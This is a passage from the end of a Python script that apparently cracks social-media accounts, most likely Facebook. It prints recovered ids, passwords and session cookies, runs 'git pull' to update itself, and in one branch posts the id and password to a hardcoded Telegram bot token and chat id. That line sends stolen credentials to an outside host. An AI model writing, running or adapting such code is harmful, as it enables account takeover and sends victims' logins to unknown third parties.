						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						break
					elif "makasih" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <=> {pw}")
						break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	asu()
